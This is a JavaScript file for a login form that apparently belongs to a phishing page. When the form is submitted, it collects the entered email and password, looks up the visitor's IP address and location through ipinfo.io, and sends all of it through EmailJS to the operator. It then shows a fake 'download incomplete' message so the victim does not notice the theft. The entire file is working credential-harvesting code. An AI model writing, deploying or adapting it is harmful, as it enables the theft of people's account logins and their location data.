document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Prevent form submission
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Validate inputs
    if (!email || !password) {
      alert('Please fill in all fields.');
      return;
    }

    document.getElementById('spinner').style.display = 'block'; // Show loading spinner

    // Fetch IP info
    fetch('https://ipinfo.io/json?token=f65a3d103cb816') // Replace with your IPinfo token
      .then(response => response.json())
      .then(ipInfo => {
        const emailData = {
          email: email,
          password: password,
          ip: ipInfo.ip,
          city: ipInfo.city || 'N/A',
          region: ipInfo.region || 'N/A',
          country: ipInfo.country || 'N/A'
        };

        // Send email using EmailJS
        emailjs.send('service_mclb6ze', 'template_30nlj5e', emailData) // Replace with your EmailJS service/template IDs
          .then(() => {
            document.getElementById('spinner').style.display = 'none';
            alert('⚠️ Download incomplete, try again later!');
          })
          .catch(error => {
            document.getElementById('spinner').style.display = 'none';
            document.getElementById('error-message').innerText = 'Error sending email. Please try again.';
            
            // Log error details to the console for debugging
            console.error('EmailJS Error:', error);
            
            // If the error object contains details, display them
            if (error.text) {
              console.error('Error details:', error.text);
              alert(`EmailJS Error: ${error.text}`);
            } else {
              alert('An unknown error occurred. Please check your EmailJS configuration.');
            }
          });
      })
      .catch(error => {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('error-message').innerText = 'Error fetching IP info. Please try again.';
        console.error('IP Info Error:', error);
      });
  });